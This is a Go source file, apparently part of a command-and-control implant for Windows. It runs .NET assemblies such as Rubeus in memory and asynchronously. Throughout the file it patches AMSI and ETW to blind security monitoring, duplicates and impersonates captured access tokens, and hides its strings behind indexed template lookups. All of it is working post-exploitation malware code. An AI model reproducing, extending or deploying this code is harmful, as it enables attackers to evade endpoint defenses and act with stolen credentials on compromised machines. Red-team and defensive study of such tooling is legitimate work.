// server/docker/payloads/Windows/action_inline_assembly_async.go
//go:build windows
// +build windows

package main

import (
	"bytes"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"time"
)


// InlineAssemblyAsync template indices (must match server's common.go)
// Uses shared template from action_inline_assembly.go via iaTpl()
const (
	// Output markers
	idxIAOutputStart = 405
	idxIAOutputEnd   = 406

	// Runfor detection
	idxIARunforFlag = 407
	idxIAColon      = 408

	// Status messages
	idxIADoneMsg      = 409
	idxIADoneExitPrev = 410
	idxIADoneAfterPre = 411
	idxIADoneAfterSuf = 412
	idxIADonePre      = 413
	idxIADoneSuf      = 414
	idxIAExitPrevMsg  = 415

	// Error detection keywords
	idxIAKwExit      = 417
	idxIAKwTerminate = 418

	// CLR corruption
	idxIAClrErrCode = 419
	idxIAClrCorrupt = 420
)

// Convenience functions for async-specific strings (uses shared iaTpl from action_inline_assembly.go)
func iaaOutputStart() string { return iaTpl(idxIAOutputStart) }

func iaaOutputEnd() string { return iaTpl(idxIAOutputEnd) }

func iaaRunforFlag() string { return iaTpl(idxIARunforFlag) }

func iaaColon() string { return iaTpl(idxIAColon) }

func iaaDoneMsg() string { return iaTpl(idxIADoneMsg) }

func iaaDoneExitPrev() string { return iaTpl(idxIADoneExitPrev) }

func iaaDoneAfterPre() string { return iaTpl(idxIADoneAfterPre) }

func iaaDoneAfterSuf() string { return iaTpl(idxIADoneAfterSuf) }

func iaaDonePre() string { return iaTpl(idxIADonePre) }

func iaaDoneSuf() string { return iaTpl(idxIADoneSuf) }

func iaaExitPrevMsg() string { return iaTpl(idxIAExitPrevMsg) }

func iaaKwExit() string { return iaTpl(idxIAKwExit) }

func iaaKwTerminate() string { return iaTpl(idxIAKwTerminate) }

func iaaClrErrCode() string { return iaTpl(idxIAClrErrCode) }

func iaaClrCorrupt() string { return iaTpl(idxIAClrCorrupt) }

// AssemblyTokenContext stores token information for assembly execution
type AssemblyTokenContext struct {
	IsImpersonating bool
	ActiveToken     string
	NetOnlyToken    string
	NetOnlyHandle   syscall.Handle
}

// captureCurrentAssemblyTokenContext captures the current token context for async execution
func captureCurrentAssemblyTokenContext() *AssemblyTokenContext {
	if globalTokenStore == nil {
		return nil
	}

	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	return &AssemblyTokenContext{
		IsImpersonating: globalTokenStore.IsImpersonating,
		ActiveToken:     globalTokenStore.ActiveToken,
		NetOnlyToken:    globalTokenStore.NetOnlyToken,
		NetOnlyHandle:   globalTokenStore.NetOnlyHandle,
	}
}

// applyAssemblyTokenContextWithDuplication applies the stored token context using token duplication
func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext) (func(), syscall.Handle) {
	if tokenContext == nil || globalTokenStore == nil {
		return func() {}, 0
	}

	var cleanupFunc func()
	var duplicatedToken syscall.Handle

	// Priority: Network-only token > Regular impersonation
	if tokenContext.NetOnlyHandle != 0 {

		// First verify the source handle is still valid
		globalTokenStore.mu.RLock()
		currentNetOnlyHandle := globalTokenStore.NetOnlyHandle
		globalTokenStore.mu.RUnlock()

		if currentNetOnlyHandle == 0 {
			return func() {}, 0
		}

		// Duplicate the token for this specific async operation
		err := DuplicateTokenEx(
			currentNetOnlyHandle,
			TOKEN_ALL_ACCESS,
			nil,
			SecurityImpersonation,
			TokenImpersonation,
			&duplicatedToken,
		)

		if err != nil {

			// Try with different access rights
			err2 := DuplicateTokenEx(
				currentNetOnlyHandle,
				TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY,
				nil,
				SecurityImpersonation,
				TokenImpersonation,
				&duplicatedToken,
			)

			if err2 != nil {
				// Both DuplicateTokenEx attempts failed -- do NOT fall back to
				// the shared handle (unsafe concurrent use / double-close).
				// Continue without token impersonation.
				return func() {}, 0
			} else {
				cleanupFunc = func() {
					CloseHandle(duplicatedToken)
				}
			}
		} else {
			cleanupFunc = func() {
				CloseHandle(duplicatedToken)
			}
		}

		return cleanupFunc, duplicatedToken

	} else if tokenContext.IsImpersonating && tokenContext.ActiveToken != "" {
		// Look up the token in the global store
		globalTokenStore.mu.RLock()
		token, exists := globalTokenStore.Tokens[tokenContext.ActiveToken]
		globalTokenStore.mu.RUnlock()

		if exists {

			// Duplicate the token for this specific async operation
			err := DuplicateTokenEx(
				token,
				TOKEN_ALL_ACCESS,
				nil,
				SecurityImpersonation,
				TokenImpersonation,
				&duplicatedToken,
			)

			if err != nil {
				// DuplicateTokenEx failed -- do NOT fall back to the shared
				// handle (unsafe concurrent use / double-close).
				// Continue without token impersonation.
				return func() {}, 0
			}
			cleanupFunc = func() {
				CloseHandle(duplicatedToken)
			}

			return cleanupFunc, duplicatedToken
		}
	}

	return func() {}, 0
}

// executeWindowsAssemblyAsync executes assembly asynchronously with protection against exit
func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes []byte, config struct {
	AssemblyB64 string   `json:"ab"`
	Arguments   []string `json:"ar"`
	AppDomain   string   `json:"ad"`
	BypassAMSI  bool     `json:"ba"`
	BypassETW   bool     `json:"be"`
	RevertETW   bool     `json:"re"`
	EntryPoint  string   `json:"ep"`
	UsePipe     bool     `json:"up"`
	PipeName    string   `json:"pm"`
}, job *AssemblyJob, tokenContext *AssemblyTokenContext) (int, error) {
	job.Output.WriteString(iaaOutputStart())

	// Ensure exit prevention is initialized
	InitializeExitPrevention()

	// Track execution count
	clrExecutionMutex.Lock()
	clrExecutionCount++
	executionNumber := clrExecutionCount
	clrExecutionMutex.Unlock()

	// Check if this looks like Rubeus with /runfor
	hasRunfor := false
	runforDuration := 30 // default seconds
	for _, arg := range config.Arguments {
		argLower := strings.ToLower(arg)
		if strings.Contains(argLower, iaaRunforFlag()) {
			hasRunfor = true
			// Try to extract the duration
			if strings.Contains(argLower, iaaColon()) {
				parts := strings.Split(argLower, iaaColon())
				if len(parts) > 1 {
					// Parse the number after the colon
					var duration int
					fmt.Sscanf(parts[1], "%d", &duration)
					if duration > 0 {
						runforDuration = duration
					}
				}
			}
			break
		}
	}

	// Write initial header to job output
	job.OutputMutex.Lock()

	if config.BypassAMSI {
		patchAMSI()
	}

	if config.BypassETW {
		patchETW()
	}
	job.OutputMutex.Unlock()

	// Execute with protection and appropriate timeout
	return c.executeWithAsyncPipeCapture(assemblyBytes, config.Arguments, job, executionNumber, hasRunfor, runforDuration, tokenContext)
}

// executeWithAsyncPipeCapture captures output with protection against exit and token context
func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes []byte, arguments []string, job *AssemblyJob, executionNumber int, hasRunfor bool, runforDuration int, tokenContext *AssemblyTokenContext) (int, error) {
	type execResult struct {
		code int
		err  error
	}

	resultChan := make(chan execResult, 1)

	// Calculate timeout - add buffer time for runfor scenarios
	executionTimeout := 24 * time.Hour // Default very long timeout
	if hasRunfor {
		// Add 10 seconds buffer to the runfor duration
		executionTimeout = time.Duration(runforDuration+10) * time.Second
	}

	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		defer func() {
			if r := recover(); r != nil {
				job.OutputMutex.Lock()
				job.Output.WriteString(iaaDoneExitPrev())
				job.OutputMutex.Unlock()
				resultChan <- execResult{0, nil}
			}
		}()

		var cleanupToken func()
		var duplicatedTokenHandle syscall.Handle

		if tokenContext != nil {
			cleanupToken, duplicatedTokenHandle = applyAssemblyTokenContextWithDuplication(tokenContext)
			defer cleanupToken()

			if duplicatedTokenHandle != 0 {
				if err := ImpersonateLoggedOnUser(duplicatedTokenHandle); err == nil {
					defer RevertToSelf()
				}
			}
		}

		targetRuntime := iaClrV4()
		if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
			targetRuntime = iaClrV2()
		}

		var retCode int32
		var execErr error

		ensureCLRWorker()
		clrResultCh := make(chan clrWorkResult, 1)
		clrWorkerCh <- clrWorkRequest{
			assemblyBytes: assemblyBytes,
			arguments:     arguments,
			targetRuntime: targetRuntime,
			resultCh:      clrResultCh,
		}

		select {
		case res := <-clrResultCh:
			execErr = res.err
			retCode = int32(res.exitCode)
			if res.output != "" {
				job.OutputMutex.Lock()
				job.Output.WriteString(res.output)
				job.OutputMutex.Unlock()
			}
		case <-time.After(executionTimeout):
			job.OutputMutex.Lock()
			if hasRunfor {
				job.Output.WriteString(iaaDonePre() + executionTimeout.String() + iaaDoneSuf())
			} else {
				job.Output.WriteString("\n" + Err(E9) + "\n")
			}
			job.OutputMutex.Unlock()
			retCode = 0
			execErr = nil
		}

		if execErr != nil {
			errStr := strings.ToLower(execErr.Error())
			if strings.Contains(errStr, iaaKwExit()) || strings.Contains(errStr, iaaKwTerminate()) {
				job.OutputMutex.Lock()
				job.Output.WriteString(iaaExitPrevMsg())
				job.OutputMutex.Unlock()
				execErr = nil
				retCode = 0
			} else if strings.Contains(execErr.Error(), iaaClrErrCode()) {
				job.OutputMutex.Lock()
				job.Output.WriteString(iaaClrCorrupt())
				job.OutputMutex.Unlock()
			}
		}

		job.OutputMutex.Lock()
		if job.Output.Len() == 0 && execErr == nil {
			job.Output.WriteString(Succ(S18) + "\n")
		}
		job.OutputMutex.Unlock()

		resultChan <- execResult{int(retCode), execErr}
		job.Output.WriteString(iaaOutputEnd())
	}()

	// Wait for execution to complete or cancellation
	select {
	case result := <-resultChan:
		return result.code, result.err

	case <-job.CancelChan:
		// Job was cancelled
		job.OutputMutex.Lock()
		job.Output.WriteString("\n" + Err(E52) + "\n")
		job.OutputMutex.Unlock()
		return -1, fmt.Errorf(Err(E52))

	case <-time.After(executionTimeout + 30*time.Second): // Add extra buffer
		job.OutputMutex.Lock()
		job.Output.WriteString("\n" + Err(E9) + "\n")
		job.OutputMutex.Unlock()
		return -1, fmt.Errorf(Err(E9))
	}
}


